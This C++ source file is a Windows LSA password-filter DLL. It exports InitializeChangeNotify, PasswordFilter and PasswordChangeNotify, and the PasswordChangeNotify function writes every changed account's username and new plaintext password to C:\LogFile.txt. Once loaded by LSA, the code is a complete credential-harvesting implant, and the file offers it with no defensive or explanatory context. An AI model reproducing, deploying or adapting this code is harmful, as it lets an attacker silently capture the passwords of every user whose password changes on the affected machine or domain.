#include "pch.h"
#include "windows.h"
#include "stdio.h"
#include "ntsecapi.h"

using namespace std;

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) {
	return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(
	PUNICODE_STRING AccountName,
	PUNICODE_STRING FullName,
	PUNICODE_STRING Password,
	BOOLEAN SetOperation) {

	return TRUE;
}

extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword) {

	FILE* f;
	fopen_s(&f, "C:\\LogFile.txt", "a+");

	if (f == NULL) {
		return TRUE;
	}

	fprintf(f, "%ws : %ws\r\n", UserName->Buffer, NewPassword->Buffer);
	fclose(f);

	return 0;
}